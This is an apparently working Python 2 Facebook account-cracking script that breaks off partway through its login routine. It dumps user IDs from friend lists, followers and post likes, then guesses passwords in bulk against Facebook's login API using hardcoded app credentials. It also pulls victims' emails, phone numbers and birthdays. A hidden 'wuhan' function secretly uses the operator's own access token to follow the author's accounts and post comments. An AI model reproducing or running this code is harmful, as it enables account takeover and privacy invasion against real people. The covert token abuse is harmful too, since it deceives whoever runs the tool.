#!/usr/bin/python2
# coding=utf-8
# Coded By ALI RAZA
# My Whatsapp ( Main Ni Bataon Ga Mughy Apna Mazak Ni Banwana HaiðŸ˜‚ðŸ˜‚)

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By ALI RAZA
import os
try:
    import requests
except ImportError:
    print '\n [Ã—] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [Ã—] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [Ã—] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
koh = '100005395413800'
xi_jimpinx = '1714000985456399'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['The person who posted is handsome:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# Black
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] token invalid %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
        os.system('xdg-open https://www.facebook.com/profile.php?id=100074666619670')
# LoGo
logo = ''' 
_ _
     /\    | (_)
    /  \   | |_   _ __ __ _ ______ _
   / /\ \ | | | | '__/ _` |_  / _` |
  / ____ \| | | | | | (_| |/ / (_| |
 /_/    \_\_|_| |_|  \__,_/___\__,_|                                                   '''

lo_ngentod = '1714009362122228'
# Black
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] Crack TAWAW BU.!...'%(N,K,N)
        print '\n\n [%s+%s] Total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] Total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] opshh you are not getting results :('%(M,N);exit()

#Token DaxL Krdn
def yayanxd():
    os.system('clear')
    print ('\x1b[1;91m[*] U KNOW HOW TO GET ACCESS TOKEN.\n')
    print('\x1b[1;95m [*] Auther : ALI RAZA\n')
    print('\x1b[1;96m [*] Fb Page : https://www.facebook.com/profile.php?id=100074666619670')
    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! try the victimized account login on google chrome first'%(B,N);time.sleep(2)
        print '%s *%s do not forget! url change to %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s *%s after switching to google chrome. click the three dots'%(B,N,H);time.sleep(2)
        print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input(' %s*%s Enter Your Token '%(O,N))
        os.system('xdg-open https://www.facebook.com/profile.php?id=100074666619670')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '\n\n %s*%s DAXL BU.! %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s Enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://www.facebook.com/profile.php?id=100074666619670')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()

### Handsome People ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%sÃ—%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%sÃ—%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Xatt Nia\n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96mâ€¢\033[0m) NAWT : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96mâ€¢\033[0m) IP TO   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. \x1b[1;95mCrack ID With File'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. \x1b[1;92mCrack ID Public'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. \x1b[1;95mCrack ID With Total Followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. \x1b[1;92mCrack ID Post'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. \x1b[1;95mSTART CRACK'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. \x1b[1;92mCrack Friend List'%(O,N);time.sleep(0.03)
    print ' [%s7%s]. \x1b[1;95mLiSt Total crack'%(O,N);time.sleep(0.03)
    print ' [%s8%s]. \x1b[1;92mBRUTE IP XOT'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. \x1b[1;95minfo %sScript%s'%(O,N,O,N);time.sleep(0.03)
    pepek = raw_input('\n [*] HALBZHERA : ')
    if pepek == '':
        print '\n %s[%sÃ—%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        followers(kontol)
    elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(kontol)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ crack results stored in your file]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] input file name :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] input file name :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] Total %scrack%s On %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [âœ“] "," \x1b[0m[\x1b[1;92mâœ“\x1b[0m]\x1b[1;92m ").replace(" [Ã—] ", " \x1b[0m[\x1b[1;93mÃ—\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sENTER%s ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n %s[%sÃ—%s] BA BATALE JEY MAHELA.!("%(N,M,N))
            raw_input('\n  [ %sENTER%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%sâœ“%s]%s successfully deleted token'%(N,H,N,H));exit()
    else:
        print '\n %s[%sÃ—%s] menu [%s%s%s] Back To Main Menu bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# do not change the bot !
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] New File  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] CHange ID BET   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] HUMU ID YAKAN...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%sâœ“%s] Crack File Saved'%(N,H,N))
        print ' [%sâ€¢%s] COPY BKA.! ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] BA BATALE JEY MAHELA.!\n'%(N,M,N))
        raw_input(' [ %sENTER%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id of public friend
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] ID Public  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] New File  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] Chand ID Bet   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        xxx = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] HUMU ID YAKAN...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%sâœ“%s] Crack ID File Saved'%(N,H,N))
        print ' [%sâ€¢%s] COPY BKA.! ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] BA BATALE JEY MAHELA.!\n'%(N,M,N))
        raw_input(' [ %sENTER%s ] '%(O,N));moch_yayan()

# dump From Public Followers
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] ID Followers  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] New File  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] CHAND ID BET  : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] HUMU ID YAKAN...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%sâœ“%s] Crack File Saved total followers'%(N,H,N))
        print ' [%sâ€¢%s] COPY BKA.! ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] BA BATEL JEY MAHELA.!\n'%(N,M,N))
        raw_input(' [ %sENTER%s ] '%(O,N));moch_yayan()

# dump id from Public post
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] ID POST : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] New FILE  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] CHAND ID BET  : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        xxx = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] HUMU ID YAKAN...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%sâœ“%s] Crack ID File Saved'%(N,H,N))
        print ' [%sâ€¢%s] COPY BKA ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] BA BATALE JEY MAHELA\n'%(N,M,N))
        raw_input(' [ %sENTER%s ] '%(O,N));moch_yayan()
#check info
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] ID/Username : "%(O,N))
        if user == '':
            print "\n [%s!%s] Fill Every Empty Place bro"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Facebook Account information *';time.sleep(0.03)
    print '\n [*] Full Name : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] first name  : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print ' [*] last name: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print ' [*] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print ' [*] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * data-facebook account *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print ' [*] mobile number  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print ' [*] date of birth  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Woman").replace("male", "male")
    except (KeyError, IOError):
    	jenis = ''
    print ' [*] gender  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [*] number of friends : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''with %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] relationship status: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] about status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] hometown     : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] stay in     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] timezone     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] last updated on %s month %s year %s time %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%sâœ“%s] successfully checked dataÂ² from facebook account\n\n'%(O,N));exit()

# check info sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] Auther       : ALI RAZA'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fb     : Ali Raza/King'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fb page       : https://www.facebook.com/profile.php?id=100074666619670'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] INFO TOOLS   :  V1.3'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sENTER%s ] '%(O,N));moch_yayan()

### change user agent
def seting_yntkts():
    print '\n (%s1%s) Check IP'%(O,N)
    print ' (%s2%s) Check IP'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%sÃ—%s] Fill Empty Place Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('BLACK.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] IP lost : %s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %scome back%s ]'%(N,O,N));moch_yayan()
    else:
        print '\n %s[%sÃ—%s] Correct Input'%(N,M,N);time.sleep(2);seting_yntkts()
# New User Agent
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] want to use your cellphone user agent [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%sÃ—%s] Fill Empty Place Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s you will be redirected to the website after being redirected to the website.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = raw_input(' [%s?%s] Enter your cellphone user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%sâœ“%s] successfully using your hp user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] Enter user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%sâœ“%s] successfully replaced user agent...'%(N,H,N))
        raw_input('\n  %s[ %sReturn Back%s ]'%(N,O,N));moch_yayan()
    else:
        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
# start squishing awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Put file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%sÃ—%s] File [%s%s%s] no, dump id first bro check numbers 1 to 4%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %sReturn Back%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] put password.? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] Use , (koma) Nmuna : pakistan,123456,dll. 6 digit password required'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] enter password: '%(O,N))
                print ' [*] crack with password -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%sÃ—%s] Fill EmPty passwors box'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%sÃ—%s] Enter minimum 6 digit password'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Pakistan 786786 123456:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%sÃ—%s] Fill Every Blank Place'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] OK result saved to -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] Cp result saved to -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] Ok result Saves to -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] CP Result Save to -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] OK Saved-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] CP Saved-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                        
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%sÃ—%s] correct input'%(N,M,N);__yan__()
                    print '\n [ Choose method login - 1 option is bestÂ² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%sÃ—%s] Y/t stupid!'%(N,M,N);self.plerr()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] Turn on airplane mode 2 seconds'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [âœ“] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
